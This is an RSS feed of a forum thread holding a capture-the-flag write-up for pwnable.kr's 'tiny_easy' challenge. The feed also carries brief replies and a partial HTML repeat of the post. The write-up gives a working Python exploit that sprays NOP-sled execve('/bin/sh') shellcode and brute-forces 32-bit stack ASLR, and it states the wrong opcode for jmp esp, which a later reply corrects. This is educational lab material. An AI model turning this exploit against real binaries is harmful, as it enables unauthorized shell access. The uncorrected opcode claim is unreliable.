<?xml version="1.0" encoding="UTF-8" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom" xmlns:dc="http://purl.org/dc/elements/1.1/">
  <channel>
    <title>Exploit Development - The Magic in Hacking</title>
    <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349</link>
    <description># The Magic in Hacking

While wandering around the various amazing topics in this forum, I noticed a lack of one of the subjects I enjoy the most - exploit development (last post was more than a month ago).

I decided to write my own post about the subject which will also be my first post in this forum.

**What we will go over in this article:**

My experience in exploit development 

Go over a CTF from [pwnable.kr](https://pwnable.kr/) step by step as we solve it.

Explain different tools i use for  and how i implemented them to solve this challenge 

**Recommended Pre-requisites:**



* Basic Linux understanding 

* X86 assembly knowledge

* Knowledge of how the stack works

* Basic C language

* understanding of Basic buffer overflow exploits

* Basic development in python  

 ***

#   A Song of Bytes and Shells

Ever since I was a kid I was intrigued with exploits. when I was around 16 and started developing malware but i always felt that while malware was something i could understand and learn how to do well, exploits were always something of a mystery to me  . I remember once, when i at home with my older brother who was much more knowledgeable than me at the time  and I asked him for the first time what exploits were after I heard about that term so many times. 

He said to me: “exploits are where magic happens in hacking”

Ever since then many winters have passed, the boy i was became a man and with it i learned more and more about the subject. I started working professionally in the field of exploit research and developed many exploits and shellcode galleries of my own. I realized how exploits are an artform of their own, they require the highest level of professionalism because a lot of the time you need a combination of various fields 
(for example: C language, assembly, understanding of the heap and stack, python for development the exploit)  in order to make an exploit and that is just the tip of iceberg. 

This can be very daunting for a someone who wants to enter the field of exploit development as it is a  zero sum game.

As Cersei Lannister described accurately :

     “When you play the game of Exploits, you pwn or you crash. There is no middle ground.”

I hope in this article that i can help ease people in to the subject and tools using 
one of my favorite CTF challenge.

***

# Don’t judge a binary by its size

Today we will analyze a CTF from one of my most favourite CTF websites - [pwnable.kr](https://pwnable.kr/)

[pwnable.kr](https://pwnable.kr/) is an amazing site for anyone wishing to try out hard exploitation and reverse engineering challenges.

I found all kinds of exploit challenges there, from memory corruptions to command injections and up to kernel write exploits and race conditions.

Highly recommend you all to check it out.

 For this article I decided to go over the tiny_easy challenge.

**![|201x303](upload://n26cYqyCR53XkI36iOElEf2C4rN.png)**


**![|475x316](upload://vOpehzHWSNTUyp1iwKhAolg9taG.png)**

Let’s SSH inside!

``` 

ssh [tiny_easy@pwnable.kr](mailto:tiny_easy@pwnable.kr) -p2222

```

(For windows users i highly recommend [mobaxterm](https://mobaxterm.mobatek.net/), it’s an easy software you can use to handle ssh sessions and download software easily) 

Inside the ssh, we run “ls” and find only a binary and our flag file which we can’t read as we don’t have any permissions 

**![|602x200](upload://nH3v2MaKux408rv6fNGF47k3WqI.png)**
Let’s download the binary and perform some  checks on it:
well start off with the “file” command. 


This command gives us details about the binary including it’s architecture, bitness(x64 vs x32) and other nice details 


**![|602x37](upload://pXyMsWCglvGaKPrvfA7yteKtdE4.png)**


We can see from this output that the file is a 32-bit ELF file for the x86 architecture and it’s statically linked.

But wait… 

**![|416x32](upload://anEZvphLOU8pUptspa5CvSGpPT8.png)**


Lets try to run the binary and see what happens :

**![|562x38](upload://1lVUamCj6dM3X8ujNmy78XLvEmZ.png)**

**![|330x214](upload://uck1ln3PuWhfOhYKbA4kPQXauUM.png)**

As seen by the fact that the binary has a corrupted header and crashes on execution, we can understand that we may be in for a bit different binary than what we usually see.

Lets open the binary in ida and go over the code 

**![|453x150](upload://c8YQfY3O87vAZGh4bLUUoKJ3huK.png)**

Wow! Look at that! this has to be the smallest CTF i&#39;ve ever looked at :)

The whole program has only 4 instructions.

We perform two pops from the stack. Takes the value from where edx points to and then jumps to it.

But wait… there aren&#39;t any calls in this program so which values are poped from the stack? 

Let’s use gdb and check it out! 

In this article i used gdb with the [peda](https://github.com/longld/peda) extension that makes debugging much easier. 

**![|602x359](upload://qLEKfjXQa7TykTwe3C0EZkpSUhW.png)**

Having a look at the stack, we see that eax will receive the value 1 and edx will receive a pointer to the string 

“/home/user/CTFs/Pwnables/tiny_easy/tiny_easy”

That is the path to our binary! 

If we continue stepping until the call to edx, we see the reason why we received our segfault earlier 

**![|602x195](upload://sH8XfWPU1vYtcL7EMKDReLPJt3K.png)**

The program attempts to jump to the address 0x6d6f682f which is value for the string “/hom”. A part of the path to our binary 

Let’s try to run our program with the parameters test1 test2 test3

We can do this by running the command in gdb 

```

run test1 test2 test3 

```


**![|602x280](upload://kdQ2cVASsWf2AMEYp1RfL3HwG71.png)**


As we can see, the stack has changed, now we have our parameters in the stack and the value at the top of the stack has changed from 0x1 to 0x4.

Remember in the C language, how the main function receives input?

```

Int main(int argc, char * argv [], char * envp)

```

argv[0]  in main always points to the path of the current binary and then argv[1] 

argv[2] and so forth will contain our arguments.

In order to successfully jump where we want, we need to have control over argv[0] because the program will jump to the value in it.

How can we control over argv[0] if it isn’t one of our parameters?

Introducing [pwnlib](http://docs.pwntools.com/en/stable/)! 

Pwnlib is a python library that allows us to easily communicate with sockets and processes for the sake of pwning them. 

The pwnlib.tubes.process  allows us to create a process of our own and control it’s different arguments (argv, envp) and so forth.

Just to show you an example of the use of pwnlib, i compiled the following code snippet:

```

int main(int argc, char * argv[])

{


    printf(&quot;\nthis is our argv[0] %s\n&quot;, argv[0]);

}

```` 

We compile and run it and get the following result:


**![|434x87](upload://vbK9eUlJr2ajvFwUYMWQr5aBI4R.png)**


Let’s use pwnlib to manipulate the argv[0] to our own string 

```

from pwnlib.tubes.process import * 

argv_program=process(argv=[&quot;awdawd&quot;], executable=&quot;/home/user/test_argv&quot;)

print argv_program.recv()

```

Now lets run our python program and see what result we received from the test_argv program:


**![|391x67](upload://6lONkmt7V095qYoPkcF76WCikQc.png)**


Great! 

We now know how to have control over argv0, this means we can jump anywhere we want in the tiny_easy binary.

Our next step is checking what mitigations does this binary have.

Let’s run [checksec](https://github.com/slimm609/checksec.sh) and see.



**![|590x131](upload://o3YEy2tbw1i52WlZyUVWSqrGfM6.png)**


**RELRO**: No RELRO - no RELRO protection here  - Not relevant 

**Stack**: No stack canary is found here. Not relevant here but cool

**NX:** NX disabled -  non executable protections is disabled, jackpot!

**PIE: **the code is not position independent - not relevant 

**Note**: By default, ASLR is enabled at stack level 

NX protection is a protection which doesn’t allow us to run code only in the code sections of a binary. This means that we can’t jump to code on the stack or heap and run them.

In this example, we can see this binary is compiled without this protection which means we can possibly jump to our code on the stack.

I need to stress this out: **checking for these kinds of protections straight in the beginning will save you a lot of time and frustration.**

In this example, because we can&#39;t control the return address and NX is disabled then our best bet is to concentrate our effort of finding a way to jump to the stack and execute our shellcode that is stored in one of our parameters.

If on the other hand, NX was enabled then this means that we couldn&#39;t jump to the stack and we needed to find a different way to run our code (ROP Gadgets, ret2libc, and many other methods) 

Now that we can control where we can jump,we need to deal with the fact that ASLR is enabled at the stack level.

Let&#39;s try to find an instruction that can allow us to jmp to the stack and thus run our shellcode.

The rest of the bytes in the program are part of the elf header


**![|602x432](upload://iHNk5STkr9zeVCzOsL1ZAEFkDZa.png)**


We can also view these bytes an instructions in IDA using the “C” hotkey

**![|602x427](upload://8UcuIBPkv8V5LeJDAKS3KGnu3vm.png)**


Our best bet for an instruction to jump to is “jmp esp”

This will jump to the stack and from there we may be able to get to our shellcode that is stored in one of the parameters.

I like to perform my searches by hand :) so i used [online disassembling](https://defuse.ca/online-x86-assembler.htm) to find what opcodes make up the jmp esp instruction.

If we try to disassemble jmp esp we get: 

ff e3 

Lets try to search this bytes in IDA using the search-&gt;sequence of bytes 

And put in ff e3 


**![|602x145](upload://hGsHQhN0xpyGKFHNXT62ZTI9SiQ.png)**


No result :( 

I tried searching for the bytes for call esp and didn’t find anything!

Now this is an interesting situation. 

We want to jump to our code on the stack but we don’t know the address to jump to because of ASLR.

We tried to find an instruction that allows us to jmp to the stack without knowing it’s address but we didn’t find any.


**Another quick idea i tried:**

Jmp to an instruction that will allow you to write bytes to code section.

You can use this method to overwrite one of the instructions with the jmp esp opcodes to one of the addresses and then perform a jump to the instruction’s address.

It’s basically like driving a train that builds its tracks while it’s going and i liked the idea of this.

Unfortunately, i checked out the segment permissions to see what are the section permission using view-&gt;Open subviews-&gt;segments and found our the following


**![|506x45](upload://o1TvYxTYUqcHwrekUpt58tP20ga.png)**


Only the R and X permissions are enabled for the code section

R - read permissions 

X - execute permissions 

The W (write) permission is disabled.

This means that if we attempt to rewrite an instruction in the code section, we will receive a segfault and the program will crash.

I banged my head on this program for a couple of hours, trying different methods of jumping to instructions but i couldn’t find a way to get to the stack successfully.

What shall a young exploiter do next? 


## ASLR in 32-bit 

I started reading about ASLR implementation on 32bit systems (remember, our binary is 32-bit ) 

And i found the following explanation:

“For 32-bit, there are 2^32 (4 294 967 296) theoretical addresses, nevertheless, the kernel will allow to control about only half of bits (2^(32/2) = 65 536) for an execution in a virtualized memory”.

This means that the stack size can randomized just up to 65,536 bytes.

If we can can control tens of thousands of shellcode bytes then we might can try to jmp to a constant address on the stack and have a good probability of success 

I checked whether it was possible to send lots of parameters with long strings  

```

from pwnlib.tubes.process import *

for i in range(600):


    argv.append(&quot;a&quot;*1024)

argv_program=process(argv=[&quot;awdawd&quot;], executable=&quot;/home/user/test_argv&quot;)

print argv_program.recv()

```


**![|384x75](upload://4Wlw1zZoYEmcSc7Nalkrqk4sVJp.png)**


We sent in this example, 6014400 bytes to our program and run succesfully 

Let’s make a slide!

A NOP slide !


**![|404x358](upload://wX9Tt0Bhnbz1bvRzt4cxwKDzQsh.png)**


We can send our parameters filled with nops and our shellcode at the end.

That way, we can jump to a random address on the stack and hopefully we will be able to land on one of our nop instructions and we will slide the whole way to our shellcode.

I made the following code that executes the program

With our payload and attempts to jump to a constant address on the stack

0xffb05544

This address was chosen for both reasons:

1.In this program i noticed after many executions with gdb that this address is most of the time in the range of the stack or very close to it

2.we needed an address without any null bytes in it because otherwise we would get 

An the following error:

“Inappropriate nulls in argv[0]:”

So i wrote the following code:

```

import struct

import random

from pwnlib.tubes.process import *

from pwnlib.exception import *

import pwnlib

# Taken from http://shell-storm.org/shellcode/files/shellcode-811.php

# execve(&#39;/bin/sh&#39;)

EXECV = &quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80&quot;

def build_shellcode(address):


    &quot;&quot;&quot;


    Build shellcode


    address - address to jump to


    &quot;&quot;&quot; 


    args = []


    args.append(address)


    shellcode =   &quot;\x90&quot;*8000 + EXECV


    for i in range(120):


        args.append(shellcode)


    return args


     

if __name__ == &quot;__main__&quot;:


    jump_address = struct.pack(&quot;I&quot;, 0xffb05544)


    for i in range(10000000):


        try:


            prog_args = build_shellcode(jump_address)


            	print &quot;attempt number: {}&quot;.format(i + 1 )


            pro = process(argv=prog_args,


                env={}, 


                executable=&quot;/home/user/CTFs/Pwnables/tiny_easy/tiny_easy&quot;)


            print &quot;started_running address {}&quot;.format(hex(struct.unpack(&quot;I&quot;,jump_address)[0]))


            pro.timeout=0.08


            # Send command shell of the process


            pro.sendline(&quot;echo we_made_it!&quot;)


            # Recv the result of the command execution  


            data = pro.recvline()


            if data:


                print &quot;received data!&quot;


                print data


                break


        except (EOFError, pwnlib.exception.PwnlibException) as e:


            print e

```

This code attempts to run the tiny_easy binary and jump to our shellcode which opens a shell. If we succeed then we will be able to send the command 

“echo we_made_it” and see it’s output 

Lets try it out

**![|486x215](upload://vtzmTTY7FVvmiioDyW7Abcy2buS.png)**

**![|486x215](upload://vtzmTTY7FVvmiioDyW7Abcy2buS.png)**


It worked! 

It seems that our nop slide did it’s job successfully, now let’s check it out on the CTF server itself.

Notice that we need to change the command we wish to execute from

“echo we_made_it” to “cat /home/tiny_easy/flag” In order to get the flag.

We can upload our script to the server’s tmp directory easily using the “scp” command like this:

```

scp -P 2222 ./pwn_tiny.py tiny_easy@pwnable.kr:/tmp/pwn_tiny.py

```


**![|432x580](upload://ukXhf8Iewj9bcpFdw0ZeifpxzZb.png)**


And there is our flag :) 

***
# Conclusions

In this article, we discussed exploit development by using a CTF example,
we learned about how inputs are received by the program from argv and argc.
Finally, saw how ASLR in 32-bit systems is vulnerable due to small randomization ranges and how to utilize this flaw to perform an attack that is statistically very plausible.

I hope you all enjoyed my first post and i&#39;ll see you all next time! 

**Sources**

**[Bypassing ASLR Protection using Brute Force](https://hacked0x90.wordpress.com/2016/10/30/bypassing-aslr-protection-using-brute-force/)**

**[Pwnable.kr](https://pwnable.kr/)**</description>
    
    <lastBuildDate>Fri, 07 Aug 2020 09:01:13 +0000</lastBuildDate>
    <category>Exploit Development</category>
    <atom:link href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss" rel="self" type="application/rss+xml" />
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[system]]></dc:creator>
        <description><![CDATA[
            <p>This topic was automatically closed after 121 days. New replies are no longer allowed.</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/11">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/11</link>
        <pubDate>Sat, 08 Aug 2020 05:01:59 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-11</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[robon]]></dc:creator>
        <description><![CDATA[
            <p>awesome each thing is clear for me in this writeup</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/10">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/10</link>
        <pubDate>Fri, 07 Aug 2020 09:01:13 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-10</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[Shawn_Kwak]]></dc:creator>
        <description><![CDATA[
            <p>Thank you for your writeup! Inspired me <img src="https://0x00sec.org/images/emoji/twitter/fire.png?v=9" title=":fire:" class="emoji" alt=":fire:"></p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/9">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/9</link>
        <pubDate>Wed, 24 Jun 2020 06:22:05 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-9</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[kingroot]]></dc:creator>
        <description><![CDATA[
            <p>i read the whole thing &amp; really didnt understand whats going on, but this looks cool .</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/7">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/7</link>
        <pubDate>Mon, 15 Jun 2020 05:48:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-7</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[ericho]]></dc:creator>
        <description><![CDATA[
            <p>This is great! Thanks for writing it!</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/6">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/6</link>
        <pubDate>Wed, 06 May 2020 01:07:31 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-6</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[x24whoami24]]></dc:creator>
        <description><![CDATA[
            <p>I’d like to thank <a class="mention" href="https://0x00sec.org/u/badcor">@badcor</a> for pointing out my mistake when I wrote that if we disassemble<br>
jmp esp<br>
we get ff e3 , that’s actually jmp ebx<br>
For jmp esp we really get ff e4</p>
<p>Sorry if anybody got confused <img src="https://0x00sec.org/images/emoji/twitter/sweat_smile.png?v=9" title=":sweat_smile:" class="emoji" alt=":sweat_smile:"></p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/5">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/5</link>
        <pubDate>Fri, 10 Apr 2020 16:13:52 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-5</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[hunter]]></dc:creator>
        <description><![CDATA[
            <p>Nice writeup. It made me realize that I miss the field of binary exploitation.</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/4">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/4</link>
        <pubDate>Wed, 08 Apr 2020 16:30:39 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-4</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[Danus]]></dc:creator>
        <description><![CDATA[
            <p>Good post, glad I invited you here &lt;3</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/3">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/3</link>
        <pubDate>Wed, 08 Apr 2020 15:07:47 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-3</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[0xDilydali]]></dc:creator>
        <description><![CDATA[
            <p>Awesome writeup, and welcome to the community! Looking forward to many more of these.</p>
          <p><a href="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/2">Read full topic</a></p>
        ]]></description>
        <link>https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349/2</link>
        <pubDate>Wed, 08 Apr 2020 14:46:10 +0000</pubDate>
        <guid isPermaLink="false">0x00sec.org-post-20349-2</guid>
        <source url="https://0x00sec.org/t/exploit-development-the-magic-in-hacking/20349.rss">Exploit Development - The Magic in Hacking</source>
      </item>
      <item>
        <title>Exploit Development - The Magic in Hacking</title>
        <dc:creator><![CDATA[x24whoami24]]></dc:creator>
        <description><![CDATA[
            <h1>The Magic in Hacking</h1>
<p>While wandering around the various amazing topics in this forum, I noticed a lack of one of the subjects I enjoy the most - exploit development (last post was more than a month ago).</p>
<p>I decided to write my own post about the subject which will also be my first post in this forum.</p>
<p><strong>What we will go over in this article:</strong></p>
<p>My experience in exploit development</p>
<p>Go over a CTF from <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> step by step as we solve it.</p>
<p>Explain different tools i use for  and how i implemented them to solve this challenge</p>
<p><strong>Recommended Pre-requisites:</strong></p>
<ul>
<li>
<p>Basic Linux understanding</p>
</li>
<li>
<p>X86 assembly knowledge</p>
</li>
<li>
<p>Knowledge of how the stack works</p>
</li>
<li>
<p>Basic C language</p>
</li>
<li>
<p>understanding of Basic buffer overflow exploits</p>
</li>
<li>
<p>Basic development in python</p>
</li>
</ul>
<hr>
<h1>A Song of Bytes and Shells</h1>
<p>Ever since I was a kid I was intrigued with exploits. when I was around 16 and started developing malware but i always felt that while malware was something i could understand and learn how to do well, exploits were always something of a mystery to me  . I remember once, when i at home with my older brother who was much more knowledgeable than me at the time  and I asked him for the first time what exploits were after I heard about that term so many times.</p>
<p>He said to me: “exploits are where magic happens in hacking”</p>
<p>Ever since then many winters have passed, the boy i was became a man and with it i learned more and more about the subject. I started working professionally in the field of exploit research and developed many exploits and shellcode galleries of my own. I realized how exploits are an artform of their own, they require the highest level of professionalism because a lot of the time you need a combination of various fields<br>
(for example: C language, assembly, understanding of the heap and stack, python for development the exploit)  in order to make an exploit and that is just the tip of iceberg.</p>
<p>This can be very daunting for a someone who wants to enter the field of exploit development as it is a  zero sum game.</p>
<p>As Cersei Lannister described accurately :</p>
<pre><code> “When you play the game of Exploits, you pwn or you crash. There is no middle ground.”
</code></pre>
<p>I hope in this article that i can help ease people in to the subject and tools using<br>
one of my favorite CTF challenge.</p>
<hr>
<h1>Don’t judge a binary by its size</h1>
<p>Today we will analyze a CTF from one of my most favourite CTF websites - <a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a></p>
<p><a href="https://pwnable.kr/" rel="noopener nofollow ugc">pwnable.kr</a> is an amazing site for anyone wishing to try out hard exploitation and reverse engineering challenges.</p>
<p>I found all kinds of exploit challenges there, from memory corruptions to command injections and up to kernel write exploits and race conditions.</p>
<p>Highly recommend you all to check it out.</p>
<p>For this article I decided to go over the tiny_easy challenge.</p>
<p><strong><img src="/uploads/default/original/2X/a/a16ec6a92f82cfc63c3f85071e890ce88f32c95b.png" alt="" data-base62-sha1="n26cYqyCR53XkI36iOElEf2C4rN" width="201" height="303"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/def6156eb0ba3236b02e0e1a8e7b4ad4359c5c22.png" alt="" data-base62-sha1="vOpehzHWSNTUyp1iwKhAolg9taG" width="475" height="316"></strong></p>
<p>Let’s SSH inside!</p>
<pre><code class="lang-auto">
ssh [tiny_easy@pwnable.kr](mailto:tiny_easy@pwnable.kr) -p2222

</code></pre>
<p>(For windows users i highly recommend <a href="https://mobaxterm.mobatek.net/" rel="noopener nofollow ugc">mobaxterm</a>, it’s an easy software you can use to handle ssh sessions and download software easily)</p>
<p>Inside the ssh, we run “ls” and find only a binary and our flag file which we can’t read as we don’t have any permissions</p>
<p><strong><img src="/uploads/default/original/2X/a/a60ffb507e6705e26b3737343378bc624be60328.png" alt="" data-base62-sha1="nH3v2MaKux408rv6fNGF47k3WqI" width="602" height="200"></strong><br>
Let’s download the binary and perform some  checks on it:<br>
well start off with the “file” command.</p>
<p>This command gives us details about the binary including it’s architecture, bitness(x64 vs x32) and other nice details</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" data-download-href="/uploads/short-url/pXyMsWCglvGaKPrvfA7yteKtdE4.png?dl=1" title=""><img src="/uploads/default/original/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560.png" alt="" data-base62-sha1="pXyMsWCglvGaKPrvfA7yteKtdE4" width="602" height="37" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/b5f1f14c7923e340f3c4bed3eccbd99e77ba2560_2_10x10.png"></a></strong></div><p></p>
<p>We can see from this output that the file is a 32-bit ELF file for the x86 architecture and it’s statically linked.</p>
<p>But wait…</p>
<p><strong><img src="/uploads/default/original/2X/4/48c2740844f8f3f2c7b4de307c4d13d9361dc2fe.png" alt="" data-base62-sha1="anEZvphLOU8pUptspa5CvSGpPT8" width="416" height="32"></strong></p>
<p>Lets try to run the binary and see what happens :</p>
<p><strong><img src="/uploads/default/original/2X/0/097ce7cb708859b49020d79e35dd3a6136390a49.png" alt="" data-base62-sha1="1lVUamCj6dM3X8ujNmy78XLvEmZ" width="562" height="38"></strong></p>
<p><strong><img src="/uploads/default/original/2X/d/d3a5d2d7701d2fa56ad16369ce191af201e72dd8.png" alt="" data-base62-sha1="uck1ln3PuWhfOhYKbA4kPQXauUM" width="330" height="214"></strong></p>
<p>As seen by the fact that the binary has a corrupted header and crashes on execution, we can understand that we may be in for a bit different binary than what we usually see.</p>
<p>Lets open the binary in ida and go over the code</p>
<p><strong><img src="/uploads/default/original/2X/5/551dfdfd41e73ca3508847b32692bc5f8b583cae.png" alt="" data-base62-sha1="c8YQfY3O87vAZGh4bLUUoKJ3huK" width="453" height="150"></strong></p>
<p>Wow! Look at that! this has to be the smallest CTF i’ve ever looked at <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p>The whole program has only 4 instructions.</p>
<p>We perform two pops from the stack. Takes the value from where edx points to and then jumps to it.</p>
<p>But wait… there aren’t any calls in this program so which values are poped from the stack?</p>
<p>Let’s use gdb and check it out!</p>
<p>In this article i used gdb with the <a href="https://github.com/longld/peda" rel="noopener nofollow ugc">peda</a> extension that makes debugging much easier.</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png" data-download-href="/uploads/short-url/qLEKfjXQa7TykTwe3C0EZkpSUhW.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png" alt="" data-base62-sha1="qLEKfjXQa7TykTwe3C0EZkpSUhW" width="602" height="359" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_602x359.png, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 1.5x, /uploads/default/original/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/b/bb9ba40da6d7c3c84bcf5705ed43d0e4727eefd8_2_10x10.png"></a></strong></div><p></p>
<p>Having a look at the stack, we see that eax will receive the value 1 and edx will receive a pointer to the string</p>
<p>“/home/user/CTFs/Pwnables/tiny_easy/tiny_easy”</p>
<p>That is the path to our binary!</p>
<p>If we continue stepping until the call to edx, we see the reason why we received our segfault earlier</p>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png" data-download-href="/uploads/short-url/sH8XfWPU1vYtcL7EMKDReLPJt3K.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png" alt="" data-base62-sha1="sH8XfWPU1vYtcL7EMKDReLPJt3K" width="602" height="195" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_602x195.png, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 1.5x, /uploads/default/original/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/c/c91d65cd37d43d9e92a77fc3c2f4858f7fca3f44_2_10x10.png"></a></strong></div><p></p>
<p>The program attempts to jump to the address 0x6d6f682f which is value for the string “/hom”. A part of the path to our binary</p>
<p>Let’s try to run our program with the parameters test1 test2 test3</p>
<p>We can do this by running the command in gdb</p>
<pre><code class="lang-auto">
run test1 test2 test3 

</code></pre>
<p><strong></strong></p><div class="lightbox-wrapper"><strong><a class="lightbox" href="https://0x00sec.org/uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png" data-download-href="/uploads/short-url/kdQ2cVASsWf2AMEYp1RfL3HwG71.png?dl=1" title=""><img src="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png" alt="" data-base62-sha1="kdQ2cVASsWf2AMEYp1RfL3HwG71" width="602" height="280" srcset="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_602x280.png, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 1.5x, /uploads/default/original/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/2X/8/8dbbf6efb7d5aa195098938f63bf27c6da1278eb_2_10x10.png"></a></strong></div><p></p>
<p>As we can see, the stack has changed, now we have our parameters in the stack and the value at the top of the stack has changed from 0x1 to 0x4.</p>
<p>Remember in the C language, how the main function receives input?</p>
<pre><code class="lang-auto">
Int main(int argc, char * argv [], char * envp)

</code></pre>
<p>argv[0]  in main always points to the path of the current binary and then argv[1]</p>
<p>argv[2] and so forth will contain our arguments.</p>
<p>In order to successfully jump where we want, we need to have control over argv[0] because the program will jump to the value in it.</p>
<p>How can we control over argv[0] if it isn’t one of our parameters?</p>
<p>Introducing <a href="http://docs.pwntools.com/en/stable/" rel="noopener nofollow ugc">pwnlib</a>!</p>
<p>Pwnlib is a python library that allows us to easily communicate with sockets and processes for the sake of pwning them.</p>
<p>The pwnlib.tubes.process  allows us to create a process of our own and control it’s different arguments (argv, envp) and so forth.</p>
<p>Just to show you an example of the use of pwnlib, i compiled the following code snippet:</p>
<pre><code class="lang-auto">
int main(int argc, char * argv[])

{


